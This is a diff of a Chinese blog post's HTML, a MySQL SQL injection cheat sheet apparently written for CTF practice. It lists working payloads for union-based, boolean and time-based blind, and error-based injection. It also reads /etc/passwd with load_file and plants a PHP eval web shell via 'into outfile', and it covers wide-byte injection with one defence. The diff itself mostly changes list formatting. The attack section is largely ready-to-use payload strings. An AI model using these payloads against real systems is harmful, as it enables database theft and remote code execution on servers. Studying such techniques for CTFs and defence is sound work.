@@ -15,7 +15,7 @@
 <meta property="og:url" content="K4ngx.github.io/2018/02/06/SQLi/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
 <meta property="og:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入  0x02 MySQL常用函数字符串连接 concat(str1, str2, s">
-<meta property="og:updated_time" content="2018-02-06T09:52:13.000Z">
+<meta property="og:updated_time" content="2018-02-06T10:21:59.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浅谈SQLi">
 <meta name="twitter:description" content="(MySQL为例) (参考 MySQL注入天书 made by lcamry) 注入点：GET参数、POST参数、Cookie、HTTP头（包括但不限于User-agent、Referer、X-Forwarded-For）。 0x01 注入类型 联合查询 盲注 布尔盲注 时间盲注   报错注入 宽字节注入 堆叠注入  0x02 MySQL常用函数字符串连接 concat(str1, str2, s">
@@ -215,58 +215,92 @@
 <li>宽字节注入</li>
 <li>堆叠注入</li>
 </ul>
-<h2 id="0x02-MySQL常用函数"><a href="#0x02-MySQL常用函数" class="headerlink" title="0x02 MySQL常用函数"></a>0x02 MySQL常用函数</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><ol>
+<h2 id="0x02-MySQL常用函数"><a href="#0x02-MySQL常用函数" class="headerlink" title="0x02 MySQL常用函数"></a>0x02 MySQL常用函数</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><ul>
 <li><p><code>concat(str1, str2, str3...)</code></p>
-<p> concat函数连接一个或者多个字符串，若其中一个为null，则返回null.</p>
+<p>  concat函数连接一个或者多个字符串，若其中一个为null，则返回null.</p>
 </li>
 <li><p><code>concat_ws(separator,str1,str2,…)</code></p>
-<p> CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符可以是一个字符串，也可以是其它参数。若分隔符为 NULL，则结果为 NULL。函数会忽略任何 str 参数中的 NULL 值。</p>
+<p>  CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符可以是一个字符串，也可以是其它参数。若分隔符为 NULL，则结果为 NULL。函数会忽略任何 str 参数中的 NULL 值。</p>
 </li>
 <li><p><code>group_concat([DISTINCT] 字段名 [Order BY 某字段 ASC/DESC] [Separator &#39;分隔符&#39;])</code></p>
-<p> 将某个字段的值连接起来，默认’,’为分隔符，可与group by一起使用。</p>
+<p>  将某个字段的值连接起来，默认’,’为分隔符，可与group by一起使用。</p>
 </li>
-</ol>
-<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><ol>
+</ul>
+<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><ul>
 <li><p><code>mid(column_name, start [,length])</code></p>
-<p> start起始为1；length若省略则返回剩余文本。mid函数仅MySQL支持。</p>
+<p>  start起始为1；length若省略则返回剩余文本。mid函数仅MySQL支持。</p>
 </li>
-<li><p>substring、substr与mid用法相同</p>
-</li>
+<li>substring、substr与mid用法相同</li>
 <li><p><code>left(string, n)</code></p>
-<p> 指定左部截取n个字符。right()为右部截取n个字符，参数同left。</p>
+<p>  指定左部截取n个字符。right()为右部截取n个字符，参数同left。</p>
 </li>
-</ol>
+</ul>
 <h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a><code>ascii()</code></h3><p>返回的字符的ascii码值。ord()相比还适用于多字节字符。</p>
 <h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><p>查找flag开头的字符串：<code>select flag from flag where flag regexp &#39;^flag&#39;</code></p>
 <h2 id="0x03-sql注入方法与技巧"><a href="#0x03-sql注入方法与技巧" class="headerlink" title="0x03 sql注入方法与技巧"></a>0x03 sql注入方法与技巧</h2><p>可用<code>&#39;or 1=1#</code>或<code>&#39;)and 1=2#</code>等来初步测试sqli。</p>
 <h3 id="a-常用查询"><a href="#a-常用查询" class="headerlink" title="a.常用查询"></a>a.常用查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">database</span>();</div><div class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata;</div><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ctf20xx'</span>;</div><div class="line"><span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.Columns <span class="keyword">where</span> table_schema=<span class="string">'ctf20xx'</span> <span class="keyword">and</span> table_name=<span class="string">'flag'</span>;</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.user;</div></pre></td></tr></table></figure>
 <h3 id="b-联合查询"><a href="#b-联合查询" class="headerlink" title="b.联合查询"></a>b.联合查询</h3><p>通过闭合语句引号或括号，使用union来查询所需内容。需要相同字段。可用<code>select 1,2,3</code>或<code>order by 3</code>来测试字段数。</p>
-<h3 id="c-布尔盲注"><a href="#c-布尔盲注" class="headerlink" title="c.布尔盲注"></a>c.布尔盲注</h3><p>2<em>1e308大法：`-1’and(select(select(flag)from(flag))like binary 0x4625)</em>2*1e308#`</p>
-<p>substr和ascii：<code>ascii(substr((select database()),1,1))=98#</code></p>
-<p>if盲注：<code>aaa&#39; and if((select flag from flag where flag like binary 0x4625),1,0)#</code></p>
-<h3 id="d-时间盲注"><a href="#d-时间盲注" class="headerlink" title="d.时间盲注"></a>d.时间盲注</h3><p>sleep(second)：<code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code></p>
-<p>benchmark(count, expr)：<code>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null) FROM (select database() as current) as tb1;</code></p>
-<h3 id="e-报错注入"><a href="#e-报错注入" class="headerlink" title="e.报错注入"></a>e.报错注入</h3><p>2<em>1e308报错：`aa’and(select(1E308</em>if((select*from(select(flag)from(flag)limit 1)x),2,2)))#`</p>
-<p>updatexml报错(限制32字符)：<code>-1&#39;and(updatexml(1,concat(0x7e,(select(substr(flag,10))from(flag))),1))#</code></p>
-<p>extractvalue报错(限制32字符)：<code>-1&#39;)and(extractvalue(1,concat(0x5c,(select(flag)from(flag)))))%23</code></p>
+<h3 id="c-布尔盲注"><a href="#c-布尔盲注" class="headerlink" title="c.布尔盲注"></a>c.布尔盲注</h3><ul>
+<li><p>2*1e308大法：<code>-1&#39;and(select(select(flag)from(flag))like binary 0x4625)*2*1e308#</code></p>
+</li>
+<li><p>substr和ascii：<code>ascii(substr((select database()),1,1))=98#</code></p>
+</li>
+<li><p>if盲注：<code>aaa&#39; and if((select flag from flag where flag like binary 0x4625),1,0)#</code></p>
+</li>
+</ul>
+<h3 id="d-时间盲注"><a href="#d-时间盲注" class="headerlink" title="d.时间盲注"></a>d.时间盲注</h3><ul>
+<li><p>sleep(second)：<code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code></p>
+</li>
+<li><p>benchmark(count, expr)：<code>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null) FROM (select database() as current) as tb1;</code></p>
+</li>
+</ul>
+<h3 id="e-报错注入"><a href="#e-报错注入" class="headerlink" title="e.报错注入"></a>e.报错注入</h3><ul>
+<li><p>2*1e308报错：<code>aa&#39;and(select(1E308*if((select*from(select(flag)from(flag)limit 1)x),2,2)))#</code></p>
+</li>
+<li><p>updatexml报错(限制32字符)：<code>-1&#39;and(updatexml(1,concat(0x7e,(select(substr(flag,10))from(flag))),1))#</code></p>
+</li>
+<li><p>extractvalue报错(限制32字符)：<code>-1&#39;)and(extractvalue(1,concat(0x5c,(select(flag)from(flag)))))%23</code></p>
+</li>
+</ul>
 <p><strong>以下技巧高版本未成功：</strong></p>
-<p>exp报错：<code>-1&#39;and(exp(~(select*from(select(flag)from(flag))a)))#</code></p>
-<p>geometrycollection报错：<code>-1&#39;and(geometrycollection((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-<p>polygon报错：<code>-1&#39;and(polygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-<p>multipolygon报错：<code>-1&#39;and(multipolygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-<p>multipoint报错：<code>-1&#39;and(multipoint((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-<p>multilinestring报错：<code>-1&#39;and(multilinestring((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
-<p>linestring报错：<code>-1&#39;and linestring((select * from (select * from (select user())a)b))</code></p>
+<ul>
+<li><p>exp报错：<code>-1&#39;and(exp(~(select*from(select(flag)from(flag))a)))#</code></p>
+</li>
+<li><p>geometrycollection报错：<code>-1&#39;and(geometrycollection((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
+</li>
+<li><p>polygon报错：<code>-1&#39;and(polygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
+</li>
+<li><p>multipolygon报错：<code>-1&#39;and(multipolygon((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
+</li>
+<li><p>multipoint报错：<code>-1&#39;and(multipoint((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
+</li>
+<li><p>multilinestring报错：<code>-1&#39;and(multilinestring((select*from(select*from(select(flag)from(flag))a)b)))#</code></p>
+</li>
+<li><p>linestring报错：<code>-1&#39;and linestring((select * from (select * from (select user())a)b))</code></p>
+</li>
+</ul>
 <p><strong>以下技巧高版本中未测试：</strong></p>
-<p>bigint超出范围：<code>select !(select * from (select user())x) - ~0</code></p>
-<p>mysql重复特性：<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></p>
-<p>计数重复报错/bug?：<code>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code></p>
-<p>上一条技巧的懵逼形式：<code>select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2))</code></p>
-<h3 id="f-导入导出操作"><a href="#f-导入导出操作" class="headerlink" title="f.导入导出操作"></a>f.导入导出操作</h3><p>load_file导出文件：</p>
+<ul>
+<li><p>bigint超出范围：<code>select !(select * from (select user())x) - ~0</code></p>
+</li>
+<li><p>mysql重复特性：<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</code></p>
+</li>
+<li><p>计数重复报错/bug?：<code>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</code></p>
+</li>
+<li><p>上一条技巧的懵逼形式：<code>select count(*) from (select 1 union select null union select !1)x group by concat((select flag from flag limit 1),floor(rand(0)*2))</code></p>
+</li>
+</ul>
+<h3 id="f-导入导出操作"><a href="#f-导入导出操作" class="headerlink" title="f.导入导出操作"></a>f.导入导出操作</h3><ul>
+<li>load_file导出文件：</li>
+</ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">load_file</span>(<span class="string">'/etc/passwd'</span>);</div></pre></td></tr></table></figure>
-<p>into outfile写入文件：</p>
+<ul>
+<li>into outfile写入文件：</li>
+</ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_GET['key']);"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/evil.php'</span>;</div></pre></td></tr></table></figure>
-<p>into outfile 后可跟<code>lines terminated by 0x...</code>(参考sqlmap os-shell)。以16进制内容结尾，而不是<code>&#39;\r\n&#39;</code>：</p>
+<ul>
+<li>into outfile 后可跟<code>lines terminated by 0x...</code>(参考sqlmap os-shell)。以16进制内容结尾，而不是<code>&#39;\r\n&#39;</code>：</li>
+</ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> * <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/evil.php'</span> <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="number">0</span>x.....;</div></pre></td></tr></table></figure>
 <p>into dumpfile写入二进制。into outfile写入文本文件。</p>
 <h3 id="g-宽字节注入"><a href="#g-宽字节注入" class="headerlink" title="g.宽字节注入"></a>g.宽字节注入</h3><p>当MySQL使用宽字节编码时，会产生宽字节注入。若<code>character_set_client=gbk</code>时。输入<code>%aa&#39;</code>对单引号转义后变成<code>%aa%5c%27</code>,其中aa5c被mysql当成一个字符，导致单引号逃逸。可通过<code>Mysql_query(&quot;SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);</code>来防御宽字节注入。</p>
